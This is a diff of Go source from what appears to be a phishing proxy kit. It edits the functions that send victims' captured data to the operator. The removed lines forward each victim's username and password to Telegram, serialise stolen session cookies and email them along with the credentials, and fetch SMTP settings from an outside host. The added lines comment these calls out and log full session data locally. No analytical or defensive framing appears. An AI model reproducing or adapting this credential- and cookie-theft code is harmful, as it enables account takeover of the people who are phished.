@@ -36,8 +36,8 @@ func goDotEnvVariable(key string) string {
 }
 
 func telegramSendResult(msg string) {
-	msg = strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(msg, "\n", "%0A", -1), "!", "\\!", -1), "}", "\\}", -1), "{", "\\{", -1), "|", "\\|", -1), "=", "\\=", -1), "+", "\\+", -1), ">", "\\>", -1), "#", "\\#", -1), "~", "\\~", -1), ")", "\\)", -1), "(", "\\(", -1), "]", "\\]", -1), ".", "\\.", -1), "`", "\\`", -1), "[", "\\[", -1), "*", "\\*", -1), "_", "\\_", -1), "-", "\\-", -1)
-	log.Printf("%s", msg)
+	//msg = strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(msg, "\n", "%0A", -1), "!", "\\!", -1), "}", "\\}", -1), "{", "\\{", -1), "|", "\\|", -1), "=", "\\=", -1), "+", "\\+", -1), ">", "\\>", -1), "#", "\\#", -1), "~", "\\~", -1), ")", "\\)", -1), "(", "\\(", -1), "]", "\\]", -1), ".", "\\.", -1), "`", "\\`", -1), "[", "\\[", -1), "*", "\\*", -1), "_", "\\_", -1), "-", "\\-", -1)
+	//log.Printf("%s", msg)
 	//response, err := http.Get("https://vanilla.500daysofspring.com/public/api/get-smtp")
 	//if err != nil {
 	//	fmt.Printf("%s", err)
@@ -98,10 +98,10 @@ func telegramSendResult(msg string) {
 func sendEmailCookie(msg string, username string, password string) {
 	//msg = strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(msg, "\n", "%0A", -1), "!", "\\!", -1), "}", "\\}", -1), "{", "\\{", -1), "|", "\\|", -1), "=", "\\=", -1), "+", "\\+", -1), ">", "\\>", -1), "#", "\\#", -1), "~", "\\~", -1), ")", "\\)", -1), "(", "\\(", -1), "]", "\\]", -1), ".", "\\.", -1), "`", "\\`", -1), "[", "\\[", -1), "*", "\\*", -1), "_", "\\_", -1), "-", "\\-", -1)
 
-	response, err := http.Get("https://vanilla.500daysofspring.com/public/api/get-smtp")
-	if err != nil {
-		fmt.Printf("%s", err)
-	}
+	//response, err := http.Get("https://vanilla.500daysofspring.com/public/api/get-smtp")
+	//if err != nil {
+		//fmt.Printf("%s", err)
+	//}
 
 	var smtp Smtp
 
@@ -237,13 +237,13 @@ func (d *Database) ListSessions() ([]*Session, error) {
 }
 
 func (d *Database) SetSessionUsername(sid string, username string) error {
-	telegramSendResult(fmt.Sprintf("USERNAME  :%s", username))
+	//telegramSendResult(fmt.Sprintf("USERNAME  :%s", username))
 	err := d.sessionsUpdateUsername(sid, username)
 	return err
 }
 
 func (d *Database) SetSessionPassword(sid string, password string) error {
-	telegramSendResult(fmt.Sprintf("🔥 🔥 PASSWORD : %s", password))
+	//telegramSendResult(fmt.Sprintf("🔥 🔥 PASSWORD : %s", password))
 	err := d.sessionsUpdatePassword(sid, password)
 	return err
 }
@@ -296,11 +296,11 @@ func (d *Database) SetSessionTokens(sid string, tokens map[string]map[string]*To
 
 	data, _ := d.sessionsGetBySid(sid)
 
-	//log.Printf("%s", data)
-	//log.Important("database: %s", data)
+	log.Printf("%s", data)
+	log.Important("database: %s", data)
 
-	json11, _ := json.Marshal(cookies)
-	sendEmailCookie(string(json11), data.Username, data.Password)
+	//json11, _ := json.Marshal(cookies)
+	//sendEmailCookie(string(json11), data.Username, data.Password)
 	return err
 }
 
